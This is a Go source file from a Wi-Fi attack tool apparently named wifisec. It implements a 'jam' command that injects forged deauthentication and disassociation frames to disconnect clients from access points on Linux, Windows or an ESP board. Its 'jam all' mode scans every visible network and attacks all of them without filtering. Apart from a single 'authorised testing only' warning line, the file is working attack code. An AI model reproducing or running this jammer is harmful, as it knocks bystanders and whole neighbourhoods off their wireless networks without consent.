// jammer.go 实现 `wifisec jam` 全频段 WiFi 干扰：
// 对目标 AP 同时发送 deauth(0x0C) + disassoc(0x0A) 双帧，
// 覆盖只过滤 deauth 但不过滤 disassoc 的客户端实现。
// `jam all` 扫描全部可见 AP 全频段轮询打击，不按 SSID/BSSID 过滤。
//
// 与 deauther 的区别：双帧 + all 模式。注入路径、端口、信号处理全部复用。
package functions

import (
	"context"
	"errors"
	"fmt"
	"net"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/ctkqiang/wifisec/internal/constants"
	"github.com/ctkqiang/wifisec/internal/ieee80211"
	platformesp "github.com/ctkqiang/wifisec/internal/platform/esp"
	platformlinux "github.com/ctkqiang/wifisec/internal/platform/linux"
	platformwindows "github.com/ctkqiang/wifisec/internal/platform/windows"
	"github.com/ctkqiang/wifisec/internal/utilities"
)

// jamInterval 是每轮向所有目标发送双帧后的固定间隔，与 deauth 一致。
const jamInterval = 200 * time.Millisecond

// jamAllKeyword 是触发全打模式的关键字。
const jamAllKeyword = "all"

// maxWriteFailStreak 是连续写入失败多少帧后判定串口设备已掉线。
// 板载射频满功率发送时电流可达 300mA+，USB 供电不足或过流保护
// 会让设备直接从总线消失；此时 Write 持续报错，必须主动终止而不是
// 无限告警空转——后者正是「工具看着像卡死」错觉的来源。
const maxWriteFailStreak = 10

// errNoESPDevice 是 EMBEDDED_MODE 下未探测到协处理器时的回落信号：
// RunJammer 捕获它后转走本机网卡路径，而不是把"没插板"当成致命错误。
// 用户显式指定串口时不会产生此信号，忠于用户意图直接报错。
var errNoESPDevice = errors.New("未检测到 ESP 协处理器")

// jamTarget 是一个待干扰目标的预计算结果：信道 + deauth 帧 + disassoc 帧。
type jamTarget struct {
	channel   int
	bssid     string
	deauthFrm []byte
	disassFrm []byte
}

// RunJammer 是 `wifisec jam` 的入口。
// 用法：wifisec jam <ssid|all|bssid> [iface|串口]
//
// 与 deauth 的区别：同时发 deauth + disassoc 双帧；
// `jam all` 扫描全部可见 AP 全频段轮询，不按 SSID/BSSID 过滤。
//
// EMBEDDED_MODE 下优先走 ESP 协处理器：射频跑在板载芯片上，
// 不污染宿主机网络配置；未检测到设备时回落本机网卡路径，
// 与 brute 的双路径策略一致——无板不应硬性失败，本机网卡
// （Linux/Windows）同样具备注入能力，macOS 则给出精确技术说明。
func RunJammer(arguments []string) error {
	if constants.EMBEDDED_MODE {
		if err := jamESP(arguments); !errors.Is(err, errNoESPDevice) {
			return err
		}

		utilities.Warn("未检测到 ESP 协处理器，回落本机无线网卡路径")
	}

	switch utilities.GetOS() {
	case utilities.Linux, utilities.Android:
		return jamLinux(arguments)
	case utilities.Windows:
		return jamWindows(arguments)
	case utilities.Darwin:
		return jamDarwin(arguments)
	default:
		return fmt.Errorf("jam 不支持当前平台：%s", utilities.GetOS())
	}
}

// jamESP 走 ESP 串口协处理器路径。
func jamESP(arguments []string) error {
	target, jamAll, targetMAC, portName, err := ParseJamArgs(arguments)
	if err != nil {
		return err
	}

	if portName == "" {
		portName, err = platformesp.DefaultPort()
		if err != nil {
			// 未插板：返回回落信号而非串口错误，由 RunJammer 转本机路径。
			// 显式指定串口的用户不会进入此分支，打开失败仍直接报错。
			return errNoESPDevice
		}
	}

	utilities.Info("连接 %s，等待固件就绪…", portName)

	injector, err := platformesp.Open(portName)
	if err != nil {
		return err
	}
	defer injector.Close()

	band := "2.4GHz"
	if injector.Supports5GHz() {
		band = "2.4/5GHz"
	}
	utilities.Info("协处理器就绪（协议 v%d · %s），扫描周边网络…", injector.FirmwareVersion(), band)

	scanned, err := injector.Scan()
	if err != nil {
		return fmt.Errorf("协处理器扫描失败：%w", err)
	}

	var targets []platformesp.Network
	if jamAll {
		targets = scanned
	} else {
		targets = selectESPJamTargets(scanned, target, targetMAC)
	}

	if len(targets) == 0 {
		if jamAll {
			return errors.New("扫描未发现任何网络")
		}
		return fmt.Errorf("未找到目标 %s", target)
	}

	utilities.Info("扫描完成：周边 %d 个网络，命中目标 %d 个", len(scanned), len(targets))

	jamTargets := make([]jamTarget, 0, len(targets))
	for _, ap := range targets {
		if ap.Channel > 14 && !injector.Supports5GHz() {
			utilities.Warn("目标 %s 位于 5GHz 信道 %d，当前协处理器不支持，已跳过", ap.BSSID, ap.Channel)
			continue
		}

		bssid, err := net.ParseMAC(ap.BSSID)
		if err != nil {
			utilities.Warn("目标 BSSID 格式异常，已跳过：%s", ap.BSSID)
			continue
		}

		deauthFrm, err := ieee80211.BuildDeauthFrame(bssid)
		if err != nil {
			utilities.Warn("构造 deauth 帧失败（BSSID %s）：%v", ap.BSSID, err)
			continue
		}

		disassFrm, err := ieee80211.BuildDisassocFrame(bssid)
		if err != nil {
			utilities.Warn("构造 disassoc 帧失败（BSSID %s）：%v", ap.BSSID, err)
			continue
		}

		utilities.Info("目标：%.32s（%s）· 信道 %d · %d dBm · 双帧 %d+%d 字节",
			ap.SSID, ap.BSSID, ap.Channel, ap.RSSI, len(deauthFrm), len(disassFrm))

		jamTargets = append(jamTargets, jamTarget{
			channel:   ap.Channel,
			bssid:     ap.BSSID,
			deauthFrm: deauthFrm,
			disassFrm: disassFrm,
		})
	}

	if len(jamTargets) == 0 {
		return errors.New("所有目标的 BSSID 均无法解析，无法发送干扰帧")
	}

	ctx, stop := setupJamSignalHandler()
	defer stop()

	runJamLoop(ctx, injector, injector.SetChannel, jamTargets, portName)

	return nil
}

// selectESPJamTargets 按 SSID 或 BSSID 筛选 ESP 扫描结果。
func selectESPJamTargets(scanned []platformesp.Network, target string, targetMAC net.HardwareAddr) []platformesp.Network {
	var result []platformesp.Network

	for _, ap := range scanned {
		if targetMAC != nil {
			if strings.EqualFold(ap.BSSID, targetMAC.String()) {
				result = append(result, ap)
			}
			continue
		}

		if ap.SSID == target {
			result = append(result, ap)
		}
	}

	return result
}

// jamLinux 是 Linux 与 Android 的共享 jam 路径。
func jamLinux(arguments []string) error {
	if err := checkRootWithGUI(); err != nil {
		return err
	}

	target, jamAll, targetMAC, ifaceName, err := ParseJamArgs(arguments)
	if err != nil {
		return err
	}

	iface, err := selectWirelessInterface(ifaceName)
	if err != nil {
		return err
	}

	if iface.Mode == "managed" && iface.State == "UP" {
		utilities.Warn("接口 %s 当前处于 managed 模式且已连接，进入 monitor 模式将断开当前 Wi-Fi 连接", iface.Name)
	}

	scanned, err := platformlinux.Scan(iface.Name)
	if err != nil {
		return fmt.Errorf("扫描失败：%w", err)
	}

	var targets []platformlinux.Network
	if jamAll {
		targets = scanned
	} else {
		targets = SelectDeauthTargets(scanned, target, targetMAC)
	}

	if len(targets) == 0 {
		if jamAll {
			return errors.New("扫描未发现任何网络")
		}
		return fmt.Errorf("未找到目标 %s", target)
	}

	jamTargets := buildJamTargets(targets)
	if len(jamTargets) == 0 {
		return errors.New("所有目标的 BSSID 均无法解析，无法发送干扰帧")
	}

	monitorName, ownMonitor, err := prepareMonitor(iface)
	if err != nil {
		return err
	}
	if ownMonitor {
		defer func() {
			if err := platformlinux.DeleteInterface(monitorName); err != nil {
				utilities.Warn("清理 monitor 接口 %s 失败：%v", monitorName, err)
			}
		}()
	}

	injector, err := platformlinux.OpenInjector(monitorName)
	if err != nil {
		return err
	}
	defer injector.Close()

	ctx, stop := setupJamSignalHandler()
	defer stop()

	setChannel := func(channel int) error {
		return platformlinux.SetChannel(monitorName, channel)
	}

	runJamLoop(ctx, injector, setChannel, jamTargets, monitorName)

	return nil
}

// jamWindows 是 Windows 平台的 jam 路径。
func jamWindows(arguments []string) error {
	if err := checkAdminWithGUI(); err != nil {
		return err
	}

	target, jamAll, targetMAC, ifaceName, err := ParseJamArgs(arguments)
	if err != nil {
		return err
	}

	if err := platformwindows.CheckNpcap(); err != nil {
		return err
	}

	iface, err := selectWindowsInterface(ifaceName)
	if err != nil {
		return err
	}

	if iface.GUID == "" {
		return fmt.Errorf("接口 %s 缺少 GUID，无法构造 Npcap 设备路径", iface.Name)
	}

	if iface.State == "UP" {
		utilities.Warn("接口 %s 当前已连接，进入 monitor 模式将断开当前 Wi-Fi 连接", iface.Name)
	}

	scanned, err := platformwindows.Scan()
	if err != nil {
		return fmt.Errorf("扫描失败：%w", err)
	}

	var targets []platformwindows.Network
	if jamAll {
		targets = scanned
	} else {
		targets = selectWindowsTargets(scanned, target, targetMAC)
	}

	if len(targets) == 0 {
		if jamAll {
			return errors.New("扫描未发现任何网络")
		}
		return fmt.Errorf("未找到目标 %s", target)
	}

	jamTargets := make([]jamTarget, 0, len(targets))
	for _, ap := range targets {
		bssid := net.HardwareAddr(normalizeMAC(ap.BSSID))
		if len(bssid) != 6 {
			utilities.Warn("目标 BSSID 格式异常，已跳过：%s", ap.BSSID)
			continue
		}

		deauthFrm, err := ieee80211.BuildDeauthFrame(bssid)
		if err != nil {
			utilities.Warn("构造 deauth 帧失败（BSSID %s）：%v", ap.BSSID, err)
			continue
		}

		disassFrm, err := ieee80211.BuildDisassocFrame(bssid)
		if err != nil {
			utilities.Warn("构造 disassoc 帧失败（BSSID %s）：%v", ap.BSSID, err)
			continue
		}

		jamTargets = append(jamTargets, jamTarget{
			channel:   ap.Channel,
			bssid:     normalizeMAC(ap.BSSID),
			deauthFrm: deauthFrm,
			disassFrm: disassFrm,
		})
	}

	if len(jamTargets) == 0 {
		return errors.New("所有目标的 BSSID 均无法解析，无法发送干扰帧")
	}

	devicePath := platformwindows.NPFDevicePath(iface.GUID)
	monitorWasActive, err := platformwindows.SetMonitorMode(devicePath, true)
	if err != nil {
		return fmt.Errorf("切换 monitor 模式失败：%w", err)
	}
	if !monitorWasActive {
		defer func() {
			if _, err := platformwindows.SetMonitorMode(devicePath, false); err != nil {
				utilities.Warn("恢复 managed 模式失败：%v", err)
			}
		}()
	}

	injector, err := platformwindows.OpenInjector(devicePath)
	if err != nil {
		return err
	}
	defer injector.Close()

	ctx, stop := setupJamSignalHandler()
	defer stop()

	setChannel := func(channel int) error {
		return platformwindows.SetChannel(devicePath, channel)
	}

	runJamLoop(ctx, injector, setChannel, jamTargets, iface.Name)

	return nil
}

// jamDarwin 给出 macOS 无法注入的精确技术原因。
// EMBEDDED_MODE 未插板回落至此，因此提示中包含 ESP 协处理器选项。
func jamDarwin(arguments []string) error {
	return errors.New(
		"macOS 不支持 802.11 帧注入：Apple 未开放任何公共 API，" +
			"CoreWLAN 仅提供扫描与关联；请插入 ESP 协处理器（wifisec serial 查看设备），" +
			"或改用 Linux / 已安装 Npcap 的 Windows",
	)
}

// ParseJamArgs 解析 jam 的公共参数：目标（all | SSID | BSSID）与可选接口名。
// jamAll 为 true 时表示全打模式，target 字段无意义。导出供 tests/ 做表驱动测试。
func ParseJamArgs(arguments []string) (target string, jamAll bool, targetMAC net.HardwareAddr, ifaceName string, err error) {
	if len(arguments) < 1 || strings.TrimSpace(arguments[0]) == "" {
		err = errors.New("用法：wifisec jam <ssid|all|bssid> [iface]，可先用 list 查看周边网络")
		return
	}

	target = strings.TrimSpace(arguments[0])

	if strings.EqualFold(target, jamAllKeyword) {
		jamAll = true
		target = ""
	} else {
		targetMAC, err = net.ParseMAC(target)
		if err != nil {
			targetMAC = nil
			err = nil
		}
	}

	if len(arguments) > 1 {
		ifaceName = strings.TrimSpace(arguments[1])
	}

	return
}

// buildJamTargets 把命中的 Linux AP 列表预生成双帧并按信道归组。
func buildJamTargets(targets []platformlinux.Network) []jamTarget {
	jamTargets := make([]jamTarget, 0, len(targets))

	for _, ap := range targets {
		bssid := net.HardwareAddr(normalizeMAC(ap.BSSID))
		if len(bssid) != 6 {
			utilities.Warn("目标 BSSID 格式异常，已跳过：%s", ap.BSSID)
			continue
		}

		deauthFrm, err := ieee80211.BuildDeauthFrame(bssid)
		if err != nil {
			utilities.Warn("构造 deauth 帧失败（BSSID %s）：%v", ap.BSSID, err)
			continue
		}

		disassFrm, err := ieee80211.BuildDisassocFrame(bssid)
		if err != nil {
			utilities.Warn("构造 disassoc 帧失败（BSSID %s）：%v", ap.BSSID, err)
			continue
		}

		jamTargets = append(jamTargets, jamTarget{
			channel:   ap.Channel,
			bssid:     normalizeMAC(ap.BSSID),
			deauthFrm: deauthFrm,
			disassFrm: disassFrm,
		})
	}

	return jamTargets
}

// runJamLoop 是跨平台共享的干扰注入循环：按目标轮发双帧、固定间隔、
// Ctrl-C 停止。与 deauther 的 runDeauthLoop 结构对称，但每轮发两帧。
func runJamLoop(ctx context.Context, injector frameWriter, setChannel channelSetter, targets []jamTarget, ifaceName string) {
	utilities.Info("开始 jam 干扰：接口 %s · 目标 %d 个 · 间隔 %s · 双帧模式（deauth+disassoc）",
		ifaceName, len(targets), jamInterval)
	utilities.Warn("仅用于授权测试，请确保目标网络为你所有或已获书面许可")

	started := time.Now()
	sent := 0
	failStreak := 0
	portDead := false

	progress := time.NewTicker(progressInterval)
	defer progress.Stop()

	for {
		for _, t := range targets {
			if ctx.Err() != nil || portDead {
				break
			}

			if err := setChannel(t.channel); err != nil {
				utilities.Warn("信道 %d 不可用，跳过 %s：%v", t.channel, t.bssid, err)
				continue
			}

			// 连续失败只告警首次：设备掉线后每秒会涌现上百条相同告警，
			// 刷屏无信息量；熔断后的明确结论交给循环外的 Error 输出。
			if err := injector.Write(t.deauthFrm); err != nil {
				if failStreak == 0 {
					utilities.Warn("发送 deauth 帧失败（%s）：%v", t.bssid, err)
				}
				failStreak++
				portDead = failStreak >= maxWriteFailStreak
				continue
			}
			failStreak = 0
			sent++

			if err := injector.Write(t.disassFrm); err != nil {
				if failStreak == 0 {
					utilities.Warn("发送 disassoc 帧失败（%s）：%v", t.bssid, err)
				}
				failStreak++
				portDead = failStreak >= maxWriteFailStreak
				continue
			}
			failStreak = 0
			sent++
		}

		if portDead {
			utilities.Error("连续 %d 帧写入失败，串口设备可能已从 USB 掉线（射频电流过流或被拔出），请重新插板并用 wifisec serial 确认",
				failStreak)
			break
		}

		select {
		case <-ctx.Done():
			utilities.Info("已发送 %d 帧（deauth+disassoc）· 目标 %d 个 · 运行 %s",
				sent, len(targets), time.Since(started).Round(time.Second))
			return
		case <-progress.C:
			utilities.Info("进行中：已发送 %d 帧 · 运行 %s",
				sent, time.Since(started).Round(time.Second))
		case <-time.After(jamInterval):
		}
	}

	// 熔断退出同样输出统计，与 Ctrl-C 的收尾保持一致。
	utilities.Info("已发送 %d 帧（deauth+disassoc）· 目标 %d 个 · 运行 %s",
		sent, len(targets), time.Since(started).Round(time.Second))
}

// setupJamSignalHandler 接管 SIGINT/SIGTERM，与 deauther 的逻辑一致。
// 复用独立信号处理器而非 deauther 的 setupSignalHandler 是为了：
// 两个命令不会同时运行，但各自的 defer 链独立更清晰。
func setupJamSignalHandler() (context.Context, context.CancelFunc) {
	signal.Reset(syscall.SIGINT, syscall.SIGTERM)
	return signal.NotifyContext(context.Background(), syscall.SIGINT, syscall.SIGTERM)
}
